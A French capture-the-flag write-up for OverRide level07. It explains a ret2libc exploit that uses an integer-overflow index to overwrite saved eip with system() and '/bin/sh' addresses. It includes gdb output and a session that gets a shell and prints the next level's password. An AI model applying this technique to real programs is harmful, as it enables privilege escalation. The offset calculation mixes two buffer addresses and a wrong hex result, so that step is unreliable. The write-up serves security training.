# level07

Ici l'idée est d'overflow le buffer du main pour stocker un appel à system, vu qu'on ne peut stocker que des int, il faut stocker les adresses sous forme d'int (todo expliquer comment on a fait ça)

En regardant le code décompilé par reko, on comprend que le parametre de `read_number` est l'array dans laquelle nos nombre sont stockés, on doit donc trouver l'offset entre l'adresse de ce buffer et `eip`
```C
word32 read_number(uint32 dwArg04[])
{
    printf(" Index: ");
    Eq_118 eax_14 = get_unum();
    printf(" Number at data[%u] is %u\n", eax_14, dwArg04[eax_14]);
    return 0x00;
}```

on met donc un breakpoint sur l'appel a `read_number`
```=> 0x0804892b <+520>:   call   0x80486d7 <read_number>
```

On voit que son paramètre est placé sur `eax` juste avant l'appel
```   0x08048928 <+517>:   mov    %eax,(%esp)``` 
on récupere donc l'adresse de `eax`
```(gdb) x $eax
0xffffd544:     0x00000000
```

puis on recupere l'adresse de `eip` avec la commande `info frame`
```(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
  ```

on a donc l'adresse du buffer: `0xffffd544`
et l'adresse de `eip`: `0xffffd70c`

`0xffffd70c` - `0xffffd520` = `0x1EC`, donc `456` en décimal.
Vu que notre buffer contient des `uint`, on divise par `4` (taille d'un uint) et on obtient l'offset:
`456` / `4` = `114`

On va donc mettre notre appel à `system` à l'index `114` en utilisant un overflow avec le nombre `1073741938`, et l'argument `/bin/sh` à l'index `116` (l'index `115` contenant la return address de system si on suit la logique du [tuto](<https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc>), mais on s'en fout apparemment, j'ai essayé de mettre plusieurs trucs différent ça change rien)

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$```

